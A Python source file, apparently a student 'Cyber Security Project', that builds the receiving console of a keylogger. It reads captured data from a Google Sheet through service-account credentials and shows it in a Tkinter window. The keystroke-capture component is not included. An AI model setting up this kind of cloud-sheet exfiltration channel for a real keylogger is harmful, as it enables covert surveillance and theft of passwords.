from pyautogui import *
import pyttsx3 as t2s
from os import listdir, mkdir
from os.path import isfile, join
import numpy as np
import cv2
from tkinter import messagebox
import threading
from tkinter import *
from time import *
from tkinter.font import Font
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from PIL import ImageTk, Image

face_cascade = cv2.CascadeClassifier('face_cas.xml')
k1 = ''
count = 0
try:
    def Main():
        class thread1(threading.Thread):
            def run(self):
                global k1
                while (True):
                    try:
                        scope = ['https://www.googleapis.com/auth/drive']
                        creds = ServiceAccountCredentials.from_json_keyfile_name('Sheet.json', scope)
                        client = gspread.authorize(creds)
                        sheet = client.open('PythonSheet').sheet1
                        k1 = sheet.row_values(1)
                    except:
                        pass
                    sleep(0.1)

        class thread2(threading.Thread):
            def run(self):
                root = Tk()

                root.title("Keylogger Receiver : Cyber Security Project 2020")

                root.resizable('false', 'false')

                root.geometry("600x600+500+100")

                def refresh():
                    scope = ['https://www.googleapis.com/auth/drive']
                    creds = ServiceAccountCredentials.from_json_keyfile_name('Sheet.json', scope)
                    client = gspread.authorize(creds)
                    sheet = client.open('PythonSheet').sheet1
                    global k1
                    k1 = sheet.row_values(1)

                f1 = Font(family="Time New Roman", size=12, weight="bold", underline=1)
                f2 = Font(family="Time New Roman", size=14, weight="bold")
                f3 = Font(family="Time New Roman", size=12, weight="bold")
                lab = Label(root, font=f2)
                lab.place(x=10, y=1)
                S = Scrollbar(root)
                T = Text(root, height=4, width=100)
                S.pack(side=RIGHT, fill=Y)
                T.pack(side=LEFT, fill=Y)
                S.config(command=T.yview)
                T.config(yscrollcommand=S.set)
                l3 = Label(root, text="Copyright @ Kundan Kumar (U-1701285) ", fg='skyblue', bg='white', font=f2).place(
                    x=120, y=560)
                l2 = Label(root, text='Receiving from Server', fg='brown', font=f1, bg='white').place(x=200, y=520)
                b1 = Button(root, text='Refresh', width=10, command=refresh, bg='orange', font=f3, height=1).place(x=10,
                                                                                                                   y=520)
                b3 = Button(root, text='Exit', command=root.quit, width=10, height=1, font=f3).place(x=450, y=520)

                def clock():
                    lab.config(text=k1)
                    T.delete(1.0, END)
                    T.insert(END, k1)
                    T.after(500, clock)
                clock()
                root.mainloop()
        t1 = thread1()
        t2 = thread2()
        t1.start()
        sleep(0.5)
        t2.start()
    Main()
except:
    pass

